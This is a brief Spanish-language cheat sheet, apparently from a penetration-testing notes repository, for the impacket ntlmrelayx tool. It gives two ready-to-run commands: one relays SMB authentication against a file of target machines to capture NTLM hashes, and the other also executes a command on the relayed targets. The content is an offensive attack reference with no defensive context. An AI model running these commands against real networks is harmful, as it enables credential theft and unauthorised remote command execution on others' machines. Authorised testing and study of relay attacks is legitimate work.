# ntlmrelayx Cheat Sheet

#### SMB Relaying, obteniendo los hash NTLM
```
impacket-ntlmrelayx -tf <FILE-TARGETS>.txt -smb2support
```

#### SMB Relaying, usando un archivo con listado de las maquinas a atacar y enviar un comando
```
impacket-ntlmrelayx -tf <FILE-TARGETS>.txt -smb2support -c "whoami"
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)